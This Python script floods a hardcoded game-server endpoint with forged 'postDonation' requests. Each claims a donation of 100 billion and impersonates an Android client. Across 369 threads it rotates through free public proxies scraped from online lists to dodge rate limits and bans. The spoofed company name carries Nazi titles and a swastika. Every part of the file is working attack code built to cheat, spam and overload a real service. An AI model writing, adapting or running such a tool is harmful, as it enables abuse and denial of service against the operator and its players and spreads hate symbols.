import requests
import concurrent.futures
import time
import random
import threading
from queue import Queue, Empty
from datetime import datetime

# Configuration
MAX_WORKERS = 369
REQUEST_TIMEOUT = 10
PROXY_FETCH_INTERVAL = 120  # seconds
REQUESTS_PER_BATCH = 1000
RETRY_LIMIT = 3
THROTTLE_DELAY = 0.1  # seconds between requests

# Proxy sources
PROXY_SOURCES = [
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=All",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
]

# Donation URL
DONATION_URL = (
    "http://52.24.104.170:8086/RestSimulator?"
    "Operation=postDonation&"
    "available_patriotism=0&"
    "company_id=4451734&"
    "company_name=%E2%9C%A0+F%C3%BChrer+und+Reichskanzler+%E5%8D%90+%28U%2B5350%29+%F0%9F%9B%A1%EF%B8%8F+%F0%9F%A6%85+%E2%9A%94%EF%B8%8F++&"
    "country=Antarctica&"
    "donation_sum=100000000000&"
    "donation_type=0&"
    "sender_company_id=4451734&"
    "user_id=16664893D4AB4748887BE0F6F0B98B53&"
    "version_code=22&"
    "war_id=55134"
)

# Headers
HEADERS = {"User-Agent": "android-asynchttp//loopj.com/android-async-http"}

# Log files
LOG_FILE = "response_log.txt"
ERROR_LOG_FILE = "error_log.txt"

# Global flags and queues
shutdown_event = threading.Event()
proxies = Queue()

def fetch_proxies():
    """Fetch proxy list from sources and populate the proxy queue."""
    all_proxies = set()
    for url in PROXY_SOURCES:
        try:
            print(f"[{datetime.now()}] Fetching proxies from {url}...")
            resp = requests.get(url, timeout=15)
            resp.raise_for_status()
            lines = resp.text.splitlines()
            proxies_found = [p.strip() for p in lines if p.strip()]
            all_proxies.update(proxies_found)
        except Exception as e:
            print(f"[{datetime.now()}] Error fetching from {url}: {e}")

    # Clear old proxies  
    while not proxies.empty():  
        try:  
            proxies.get_nowait()  
        except Empty:  
            break  

    for proxy in all_proxies:  
        proxies.put(proxy)  

    print(f"[{datetime.now()}] Total proxies fetched: {len(all_proxies)}")

def make_request():
    """Attempt a single request using a proxy with retries."""
    for attempt in range(RETRY_LIMIT):
        if shutdown_event.is_set():
            return

        try:  
            proxy = proxies.get(timeout=10)  
        except Empty:  
            fetch_proxies()  
            continue  

        proxy_dict = {"http": f"http://{proxy}", "https": f"http://{proxy}"}  

        try:  
            print(f"[{datetime.now()}] Using proxy: {proxy}")  
            response = requests.get(DONATION_URL, headers=HEADERS, proxies=proxy_dict, timeout=REQUEST_TIMEOUT)  
            response.raise_for_status()  

            with open(LOG_FILE, "a") as log:  
                log.write(f"{datetime.now()} - Success: {proxy}\n{response.text[:500]}\n\n")  

            print(f"[{datetime.now()}] Success with proxy: {proxy}")  
            return  # Exit after success  

        except Exception as e:  
            with open(ERROR_LOG_FILE, "a") as error_log:  
                error_log.write(f"{datetime.now()} - {proxy} - Error: {e}\n")  
            print(f"[{datetime.now()}] Failed with {proxy}: {e}")  

        finally:  
            if attempt == RETRY_LIMIT - 1:  
                print(f"[{datetime.now()}] Removing bad proxy: {proxy}")  
            else:  
                proxies.put(proxy)  

        time.sleep(THROTTLE_DELAY)

def worker():
    """Worker thread to perform repeated requests."""
    while not shutdown_event.is_set():
        make_request()

def main():
    """Main execution function."""
    fetch_proxies()

    threads = []  
    for _ in range(MAX_WORKERS):  
        t = threading.Thread(target=worker)  
        t.start()  
        threads.append(t)  

    try:  
        last_fetch_time = time.time()  
        while not shutdown_event.is_set():  
            time.sleep(REQUESTS_PER_BATCH * THROTTLE_DELAY)  

            if time.time() - last_fetch_time > PROXY_FETCH_INTERVAL:  
                fetch_proxies()  
                last_fetch_time = time.time()  

    except KeyboardInterrupt:  
        print(f"\n[{datetime.now()}] Shutting down gracefully...")  
        shutdown_event.set()  

    finally:  
        print(f"[{datetime.now()}] Waiting for threads to finish...")  
        for t in threads:  
            t.join()  
        print(f"[{datetime.now()}] All threads completed. Program exited successfully.")

if __name__ == "__main__":
    main()